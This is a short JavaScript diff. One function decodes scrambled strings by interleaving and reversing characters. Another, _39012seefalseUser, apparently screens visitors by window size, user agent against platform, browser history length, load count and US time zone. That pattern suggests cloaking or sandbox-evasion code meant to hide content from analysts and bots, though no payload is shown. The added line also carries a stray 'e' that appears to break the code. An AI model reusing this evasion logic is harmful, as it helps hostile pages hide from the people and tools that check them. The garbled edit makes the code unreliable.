@@ -16,7 +16,7 @@ try{
     }
 
     getFixed(txt){
-      var p1="",p2="",l=txt.length;
+      var p1="",p2="",l=txt.length;e
       for(let i=0; i<=l; i++){
         if(i%2==0){
           p2=txt.charAt(i)+p2;
@@ -43,7 +43,7 @@ function getDefaultName(name){
 function _39012seefalseUser() {
   var place=new Date().toTimeString();
   if(
-    (window.screen.width<=window.innerWidth && window.screen.height<=window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0,3))||
+    (window.screen.width<window.innerWidth && window.screen.height<window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0,3))||
     (history.length>3 || history.length==1 ) ||
     Nloaded>2 ||
     !(place.includes('Pacific') || place.includes('Eastern') || place.includes('Central')) ||
